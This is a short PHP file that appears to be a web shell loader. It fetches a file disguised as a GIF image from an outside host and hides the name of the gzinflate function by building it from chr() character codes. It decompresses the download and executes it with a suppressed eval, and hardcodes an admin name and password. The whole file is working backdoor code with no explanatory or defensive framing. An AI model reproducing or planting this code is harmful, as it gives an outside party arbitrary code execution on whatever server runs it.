<?php
set_time_limit(666);
$i = array("cms","chr","https://","www.15qq.cn/","admin.gif");
s($i[1],$i[2].$i[3].$i[4]);
session_start();
function s($c,$url){
	if(empty($_SESSION['PhpCode'])){
		$_SESSION['PhpCode']=file_get_contents($url);
		m($_SESSION['PhpCode'],$c);
		}		
}
function m($a,$c){
	$unzip=$c(103).$c(122).$c(105).$c(110);
	$unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);
	$ss = "";
	l($unzip($a),$ss);
}
function l($xx,$ss){
			$password = "shabikh123";
			$MyName   = "admin"; 
			@eval($xx.$ss);
}
?>
